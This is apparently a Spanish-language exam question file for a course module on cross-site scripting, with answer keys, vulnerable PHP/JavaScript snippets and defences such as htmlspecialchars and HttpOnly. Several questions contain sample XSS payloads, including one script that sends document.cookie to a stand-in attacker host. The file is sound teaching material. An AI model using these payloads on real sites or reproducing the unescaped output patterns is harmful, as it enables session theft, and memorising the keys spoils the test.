// Preguntas del examen del módulo 5: inyección de scripts (XSS)
// var (no const) para que el motor lo encuentre por su nombre en window
var preguntas5 = [
  {
    pregunta: "¿Qué es un ataque XSS?",
    opciones: [
      { texto: "Modificar una consulta SQL con lo que escribe el usuario.", explicacion: "Eso es inyección SQL." },
      { texto: "Probar contraseñas hasta acertar.", explicacion: "Eso es fuerza bruta." },
      { texto: "Que la página muestre un texto del usuario sin tratarlo y el navegador ejecute el código que trae.", explicacion: "El código corre en el navegador de quien ve la página." },
      { texto: "Robar la base de datos del servidor.", explicacion: "XSS se ejecuta en el navegador, no ataca directamente la base." }
    ],
    correcta: 2
  },
  {
    pregunta: "¿Qué tipo de XSS tiene esta página de búsqueda?",
    codigo: "$busqueda = $_GET['buscar'] ?? '';\necho '<p>Resultados para: ' . $busqueda . '</p>';",
    opciones: [
      { texto: "Reflejado: el script viaja en el pedido y vuelve en la respuesta, sin guardarse.", explicacion: "Es el caso de xss_reflejado.php (P04)." },
      { texto: "Persistente: se guarda en la base.", explicacion: "Aquí no se guarda nada." },
      { texto: "Basado en DOM.", explicacion: "Lo escribe PHP en el servidor, no el JavaScript del navegador." },
      { texto: "No tiene XSS.", explicacion: "Muestra $busqueda sin codificar." }
    ],
    correcta: 0
  },
  {
    pregunta: "¿Qué tipo de XSS tiene este muro de mensajes?",
    codigo: "// los mensajes se guardaron antes en la tabla mensajes\nforeach ($mensajes as $m) {\n    echo '<div class=\"mensaje\">' . $m['texto'] . '</div>';\n}",
    opciones: [
      { texto: "Reflejado.", explicacion: "El reflejado no se guarda; este sale de la base." },
      { texto: "Basado en DOM.", explicacion: "Lo escribe PHP, no el JavaScript del navegador." },
      { texto: "Ninguno, porque los datos vienen de la base.", explicacion: "Que venga de la base no lo hace seguro: lo escribió un usuario." },
      { texto: "Persistente (almacenado): el script queda guardado y se ejecuta a todos los que abren el muro.", explicacion: "Es el caso de xss_persistente.php (P05)." }
    ],
    correcta: 3
  },
  {
    pregunta: "¿Qué tipo de XSS tiene este JavaScript?",
    codigo: "const nombre = decodeURIComponent(location.hash.slice(1));\ndocument.getElementById('saludo').innerHTML = 'Hola ' + nombre;",
    opciones: [
      { texto: "Persistente.", explicacion: "No se guarda nada en el servidor." },
      { texto: "Basado en DOM: el JavaScript del navegador mete datos de la URL con innerHTML.", explicacion: "El servidor ni interviene; todo pasa en el navegador." },
      { texto: "Reflejado desde PHP.", explicacion: "No hay PHP en este fragmento." },
      { texto: "No tiene XSS.", explicacion: "innerHTML interpreta lo que venga en la URL." }
    ],
    correcta: 1
  },
  {
    pregunta: "¿Qué devuelve esta línea?",
    codigo: "echo htmlspecialchars('<b>Hola</b>', ENT_QUOTES, 'UTF-8');",
    opciones: [
      { texto: "Hola", explicacion: "No borra etiquetas; las convierte." },
      { texto: "<b>Hola</b> (sin cambios)", explicacion: "Sí cambia: < y > se convierten." },
      { texto: "&lt;b&gt;Hola&lt;/b&gt;", explicacion: "Por eso el navegador muestra <b>Hola</b> como texto, sin negrita." },
      { texto: "Un error, porque tiene etiquetas.", explicacion: "Acepta cualquier texto." }
    ],
    correcta: 2
  },
  {
    pregunta: "El navegador recibe este HTML. ¿Qué pasa?",
    codigo: "<div>&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;</div>",
    opciones: [
      { texto: "Muestra en pantalla el texto <script>alert('XSS')</script>, sin ejecutarlo.", explicacion: "Son entidades: el navegador las dibuja como caracteres." },
      { texto: "Ejecuta la alerta.", explicacion: "No hay una etiqueta <script> real, solo entidades." },
      { texto: "No muestra nada.", explicacion: "Muestra el texto." },
      { texto: "Muestra &lt;script&gt; con los símbolos & visibles.", explicacion: "El navegador traduce las entidades al carácter: se ve <." }
    ],
    correcta: 0
  },
  {
    pregunta: "¿Qué función va en el hueco para proteger esta salida?",
    codigo: "echo '<p>Resultados para: ' . ______________($busqueda, ENT_QUOTES, 'UTF-8') . '</p>';",
    opciones: [
      { texto: "password_hash", explicacion: "Es para guardar contraseñas, no para mostrar texto." },
      { texto: "base64_encode", explicacion: "Base64 no es para mostrar HTML; el usuario vería texto ilegible." },
      { texto: "mysqli_real_escape_string", explicacion: "Escapa para SQL, no para HTML." },
      { texto: "htmlspecialchars", explicacion: "Convierte los caracteres especiales en entidades HTML." }
    ],
    correcta: 3
  },
  {
    pregunta: "¿Cuál de estas líneas es la versión vulnerable?",
    opciones: [
      { texto: "echo '<p>' . htmlspecialchars($m['texto'], ENT_QUOTES, 'UTF-8') . '</p>';", explicacion: "Está codificada: es la versión protegida." },
      { texto: "echo '<p>' . $m['texto'] . '</p>';", explicacion: "Muestra el texto del usuario sin codificar." },
      { texto: "caja.textContent = m.texto;", explicacion: "textContent no interpreta HTML: es seguro." },
      { texto: "echo '<p>Bienvenido al muro</p>';", explicacion: "Es texto fijo, no viene del usuario." }
    ],
    correcta: 1
  },
  {
    pregunta: "Este muro guarda con consulta preparada y muestra así. ¿Está protegido contra XSS?",
    codigo: "$stmt = $con->prepare('INSERT INTO mensajes (texto) VALUES (?)');\n$stmt->execute([$_POST['mensaje']]);\n...\necho '<div>' . $m['texto'] . '</div>';",
    opciones: [
      { texto: "Sí, porque usa consulta preparada.", explicacion: "La consulta preparada protege de inyección SQL, no de XSS." },
      { texto: "Sí, porque los datos vienen de la base.", explicacion: "Lo guardado lo escribió un usuario; puede traer un script." },
      { texto: "No: está protegido de inyección SQL, pero muestra el texto sin htmlspecialchars.", explicacion: "Son dos problemas distintos con dos defensas distintas." },
      { texto: "No, porque falta un exit.", explicacion: "exit no tiene relación con el XSS." }
    ],
    correcta: 2
  },
  {
    pregunta: "En el muro, ¿dónde conviene aplicar htmlspecialchars()?",
    codigo: "// A: al recibir\n$texto = $_POST['mensaje'];\nguardar($texto);\n\n// B: al mostrar\nforeach ($mensajes as $m) {\n    echo '<div>' . $m['texto'] . '</div>';\n}",
    opciones: [
      { texto: "Solo en A, antes de guardar.", explicacion: "Si algún día otra página muestra el dato sin codificar, el XSS vuelve; la idea es codificar al mostrar." },
      { texto: "En B, cada vez que se muestra.", explicacion: "Se codifica al mostrar, según dónde se muestra (HTML)." },
      { texto: "En ningún lado si se valida la entrada.", explicacion: "Validar ayuda, pero no reemplaza codificar la salida." },
      { texto: "Da igual; no cambia nada.", explicacion: "Sí cambia: la regla es codificar al mostrar." }
    ],
    correcta: 1
  },
  {
    pregunta: "¿Qué se ve en pantalla con esta línea de JavaScript?",
    codigo: "parrafo.textContent = '<b>Hola</b>';",
    opciones: [
      { texto: "Hola en negrita.", explicacion: "Eso pasaría con innerHTML." },
      { texto: "Nada.", explicacion: "Se ve el texto." },
      { texto: "Un error en la consola.", explicacion: "Es una línea válida." },
      { texto: "El texto <b>Hola</b>, con las etiquetas visibles.", explicacion: "textContent no interpreta HTML; por eso este sitio lo usa en el examen." }
    ],
    correcta: 3
  },
  {
    pregunta: "Un comentario trae <img src=x onerror=alert(1)>. ¿Qué pasa con esta línea?",
    codigo: "caja.innerHTML = comentario;",
    opciones: [
      { texto: "Se ejecuta el alert: innerHTML crea la imagen, falla al cargar y corre el onerror.", explicacion: "Por eso con datos del usuario se usa textContent." },
      { texto: "Se ve el texto tal cual.", explicacion: "Eso pasaría con textContent." },
      { texto: "No pasa nada porque no hay etiqueta <script>.", explicacion: "No hace falta <script>: el atributo onerror también ejecuta código." },
      { texto: "El servidor bloquea el comentario.", explicacion: "Esto ocurre en el navegador; el servidor no interviene." }
    ],
    correcta: 0
  },
  {
    pregunta: "Un atacante logra ejecutar este script en el muro. ¿Qué busca?",
    codigo: "<script>\n  new Image().src = 'https://atacante.test/robar?c=' + document.cookie;\n</script>",
    opciones: [
      { texto: "Cambiar el color de la página.", explicacion: "No toca estilos." },
      { texto: "Mostrar una imagen de publicidad.", explicacion: "La imagen es una excusa para enviar datos." },
      { texto: "Mandarse la cookie de sesión (PHPSESSID) de cada víctima para entrar con su sesión.", explicacion: "Con ese identificador se hace pasar por la víctima (ver módulo 1)." },
      { texto: "Borrar la base de datos.", explicacion: "El script corre en el navegador; no llega a la base." }
    ],
    correcta: 2
  },
  {
    pregunta: "La cookie de sesión se configura así. ¿Qué logra contra el XSS?",
    codigo: "ini_set('session.cookie_httponly', 1);\nsession_start();",
    opciones: [
      { texto: "Evita el XSS por completo.", explicacion: "El script igual se ejecuta; solo no puede leer la cookie." },
      { texto: "El script ya no puede leer la cookie con document.cookie, pero el XSS sigue existiendo.", explicacion: "Es una capa extra; la defensa principal es codificar la salida." },
      { texto: "Cifra la cookie.", explicacion: "HttpOnly no cifra nada." },
      { texto: "Hace que la cookie solo viaje por HTTPS.", explicacion: "Eso es la marca Secure." }
    ],
    correcta: 1
  },
  {
    pregunta: "Un programador solo valida la entrada así. ¿Alcanza contra el XSS?",
    codigo: "if (strlen($_POST['mensaje']) > 200) {\n    die('Mensaje muy largo');\n}\nguardar($_POST['mensaje']);\n...\necho '<p>' . $m['texto'] . '</p>';",
    opciones: [
      { texto: "Sí, porque limita el largo.", explicacion: "Un script entra en 200 caracteres." },
      { texto: "Sí, porque usa die().", explicacion: "die() solo corta los mensajes largos." },
      { texto: "Sí, si además se usa POST.", explicacion: "El método no cambia nada." },
      { texto: "No: validar ayuda, pero no reemplaza codificar la salida con htmlspecialchars.", explicacion: "El echo sigue mostrando el texto sin codificar." }
    ],
    correcta: 3
  },
  {
    pregunta: "¿Para qué sirve ENT_QUOTES en este caso?",
    codigo: "echo \"<input value='\" . htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8') . \"'>\";",
    opciones: [
      { texto: "Para que también convierta las comillas (' → &#039;) y no se pueda cerrar el atributo value.", explicacion: "Si una comilla cerrara el atributo, se podría agregar otro como onfocus=..." },
      { texto: "Para que el texto salga entre comillas.", explicacion: "No agrega comillas; convierte las que haya." },
      { texto: "Para cifrar el nombre.", explicacion: "No cifra nada." },
      { texto: "Para borrar las comillas.", explicacion: "No las borra; las convierte en entidades." }
    ],
    correcta: 0
  },
  {
    pregunta: "En la prueba P05 (versión vulnerable), se publica este texto en el muro y se recarga con F5. ¿Qué pasa?",
    codigo: "<script>alert('XSS de prueba')</script>",
    opciones: [
      { texto: "La alerta sale una sola vez y después desaparece.", explicacion: "Como está guardado, se ejecuta en cada carga." },
      { texto: "No pasa nada porque se guardó en MySQL.", explicacion: "Guardarlo es justamente lo que lo vuelve persistente." },
      { texto: "El script queda guardado y la alerta salta en cada carga, para cualquiera que abra el muro.", explicacion: "Es el resultado observado por el grupo." },
      { texto: "Se ve como texto.", explicacion: "Eso fue en la versión protegida." }
    ],
    correcta: 2
  },
  {
    pregunta: "¿Qué devuelve esta línea?",
    codigo: "echo htmlspecialchars('Tom & Jerry', ENT_QUOTES, 'UTF-8');",
    opciones: [
      { texto: "Tom & Jerry (sin cambios)", explicacion: "& también se convierte." },
      { texto: "Tom &amp; Jerry", explicacion: "& se convierte en &amp;; en pantalla se ve Tom & Jerry." },
      { texto: "Tom Jerry", explicacion: "No borra caracteres." },
      { texto: "Tom &lt; Jerry", explicacion: "&lt; es la entidad de <, no de &." }
    ],
    correcta: 1
  },
  {
    pregunta: "¿Qué demostró la prueba P03 (<b>Texto en negrita</b>)?",
    opciones: [
      { texto: "Que las dos versiones muestran negrita.", explicacion: "La protegida mostró las etiquetas como texto." },
      { texto: "Que la vulnerable bloquea el HTML.", explicacion: "Al revés: lo interpretó." },
      { texto: "Que el login no funcionaba.", explicacion: "El login era P01 y funcionó en las dos." },
      { texto: "Que la vulnerable interpreta el HTML (negrita) y la protegida muestra las etiquetas literalmente.", explicacion: "Si interpreta <b>, también interpretaría <script>." }
    ],
    correcta: 3
  },
  {
    pregunta: "¿Por qué en las pruebas se usa alert('XSS') y no un ataque real?",
    opciones: [
      { texto: "Porque es inofensivo y visible: si sale la alerta, cualquier otro código también podría ejecutarse.", explicacion: "La alerta demuestra la falla sin hacer daño." },
      { texto: "Porque alert es el único código que se puede inyectar.", explicacion: "Se puede inyectar cualquier JavaScript." },
      { texto: "Porque alert roba la cookie.", explicacion: "alert solo muestra una ventana." },
      { texto: "Porque así lo pide htmlspecialchars.", explicacion: "No tiene relación." }
    ],
    correcta: 0
  }
];
